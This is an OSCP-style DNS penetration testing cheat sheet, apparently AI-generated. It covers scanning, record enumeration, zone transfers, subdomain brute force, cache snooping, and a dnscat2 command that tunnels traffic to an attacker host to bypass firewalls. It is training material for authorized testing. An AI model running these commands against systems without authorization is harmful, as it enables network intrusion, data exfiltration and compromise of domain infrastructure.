# ğŸ§¬ **DNS Penetration Testing â€“ Real-World & OSCP Guide**

> **Service:** Domain Name System
> **Ports:** `53/UDP`, `53/TCP`
> **Core Goal:**
> âœ Discover hosts, subdomains, internal infrastructure, credentials, and pivot paths

---

## ğŸ›°ï¸ Phase 1 â€” Discovery & Recon

### ğŸ¯ Detect DNS

```bash
sudo nmap -p 53 -sU -sV target
sudo nmap -p 53 -sT target
```

### ğŸ§¾ DNS Version Fingerprinting

```bash
dig @target version.bind CHAOS TXT
```

---

## ğŸ” Phase 2 â€” Enumeration

### ğŸŒ Basic Records

```bash
dig @target example.com ANY
nslookup example.com target
```

### ğŸ§‘â€ğŸ’» Name Servers

```bash
dig NS example.com
```

### ğŸ“¬ Mail Servers

```bash
dig MX example.com
```

---

## ğŸ§© Phase 3 â€” Zone Transfer (Critical)

```bash
dig AXFR example.com @target
```

**If successful â†’ full internal map**
Subdomains, servers, IPs, VPN hosts, dev machines, AD controllers ğŸ’€

---

## ğŸ§ª Phase 4 â€” Subdomain Brute Force

```bash
dnsenum example.com
dnsrecon -d example.com -t std
dnsrecon -d example.com -D subdomains.txt -t brt
```

---

## ğŸ§¨ Phase 5 â€” Cache Snooping

```bash
dig @target facebook.com
dig @target internal.example.com
```

If answers exist â†’ you learn visited internal domains

---

## ğŸ§¯ Phase 6 â€” DNSSEC Misconfig Check

```bash
dig +dnssec example.com
```

Improper config may allow spoofing & MITM

---

## ğŸ§¬ Phase 7 â€” Nmap DNS Scripts

```bash
nmap -p 53 --script dns-zone-transfer target
nmap -p 53 --script dns-recursion target
nmap -p 53 --script dns-cache-snoop target
```

---

## ğŸ•µï¸ Phase 8 â€” Pivoting via DNS

### Tunnel traffic over DNS (bypass firewall)

```bash
dnscat2-server
dnscat2 client <attacker-ip>
```

Used when only port 53 allowed â€” **OSCP loves this**

---

## ğŸ§¬ Phase 9 â€” AD & Internal Network Discovery

When domain found:

```bash
nslookup
set type=SRV
_ldap._tcp.dc._msdcs.domain.local
```

Finds **Domain Controllers**

---

## ğŸ§ª Real-World Attack Flow

```text
DNS â†’ Subdomain â†’ VPN host â†’ Web panel â†’ Creds â†’ SMB â†’ AD â†’ DA
```

DNS is often **the first domino**.

---

## ğŸ§  OSCP Exam Tips

| Skill          | Required |
| -------------- | -------- |
| Zone Transfer  | â­â­â­â­â­    |
| Subdomain Enum | â­â­â­â­â­    |
| SRV Records    | â­â­â­â­     |
| DNS Tunneling  | â­â­â­      |
| AD Discovery   | â­â­â­â­â­    |

---

## ğŸ§± Defense (What Report Should Mention)

* Disable zone transfer
* Restrict recursion
* DNSSEC properly configured
* Monitor suspicious queries

---

## ğŸ Final OSCP Checklist

âœ” Find DNS
âœ” Check AXFR
âœ” Enumerate records
âœ” Brute subdomains
âœ” Discover AD
âœ” Pivot if needed

---

If you want, next I can give you:

âœ… **DNS attack lab setup (Windows + Kali)**
âœ… **One-page OSCP DNS cheat sheet**
âœ… **How DNS leads to full domain compromise**
